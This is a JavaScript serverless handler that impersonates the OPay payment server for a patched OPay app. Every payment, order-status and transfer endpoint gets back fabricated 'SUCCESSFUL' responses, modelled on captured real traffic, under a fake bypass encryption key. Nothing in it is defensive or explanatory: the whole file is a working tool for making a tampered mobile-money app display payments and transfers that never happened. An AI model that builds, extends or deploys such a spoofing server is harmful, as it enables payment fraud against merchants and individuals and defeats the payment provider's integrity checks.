// Complete Vercel Server for Patched OPay App
// Using exact response formats captured from real OPay server

export default async function handler(req, res) {
    // Only accept POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const url = req.url;
    
    console.log('\n[!] ==========================================');
    console.log('[!] OPay Request Received');
    console.log('[!] URL:', url);
    console.log('[!] Time:', new Date().toISOString());
    console.log('[!] Headers:', req.headers);
    console.log('[!] Body received:', req.body ? 'Yes' : 'No');
    console.log('[!] ==========================================\n');

    // Determine which endpoint was called
    let endpoint = 'unknown';
    if (url && url.includes('get_payment_info')) endpoint = 'get_payment_info';
    else if (url && url.includes('confirm_pay')) endpoint = 'confirm_pay';
    else if (url && url.includes('query_pay_result')) endpoint = 'query_pay_result';
    else if (url && url.includes('showStatus')) endpoint = 'showStatus';
    else if (url && url.includes('create-order')) endpoint = 'create-order';

    console.log('[+] Detected endpoint:', endpoint);

    // ============================================
    // EXACT RESPONSE FORMATS FROM CAPTURED DATA
    // ============================================

    let responseData;

    switch(endpoint) {
        case 'confirm_pay':
            // EXACT format from your successful capture
            responseData = {
                code: "00000",
                data: {
                    paymentNo: `260603${Date.now().toString().slice(0,10)}${Math.random().toString(36).substring(2,15)}`,
                    isPolling: true,
                    orderNo: `26060301010000${Math.random().toString(36).substring(2,15)}`
                },
                message: "SUCCESSFUL"
            };
            break;

        case 'get_payment_info':
            responseData = {
                code: "00000",
                message: "SUCCESSFUL",
                data: {
                    paymentInfo: {
                        orderNo: `PAY${Date.now()}`,
                        amount: { currency: "NGN", value: "100.00" },
                        serviceType: "coinsTransfer",
                        status: "SUCCESS"
                    }
                }
            };
            break;

        case 'query_pay_result':
            responseData = {
                code: "00000",
                message: "SUCCESSFUL",
                data: {
                    orderStatus: "SUCCESS",
                    orderNo: `QRY${Date.now()}`,
                    status: "SUCCESS"
                }
            };
            break;

        case 'showStatus':
            responseData = {
                code: "00000",
                message: "SUCCESSFUL",
                data: {
                    orderStatus: "SUCCESS",
                    status: "SUCCESS"
                }
            };
            break;

        case 'create-order':
        default:
            responseData = {
                code: "00000",
                message: "SUCCESSFUL",
                data: {
                    orderStatus: "SUCCESS",
                    orderNo: `TFR${Date.now()}`,
                    paymentResult: "Transaction is successful!"
                }
            };
            break;
    }

    // Convert to JSON and then to base64 for the encrypt_data field
    const plainJson = JSON.stringify(responseData);
    const encrypt_data = Buffer.from(plainJson).toString('base64');

    console.log('[+] Sending response for:', endpoint);
    console.log('[+] Plaintext response:', plainJson);
    console.log('[+] Encrypted data (base64):', encrypt_data.substring(0, 100) + '...');

    // Return in the format the app expects
    return res.status(200).json({
        encrypt_aes_key: "PATCHED_BYPASS_KEY",
        encrypt_data: encrypt_data
    });
}
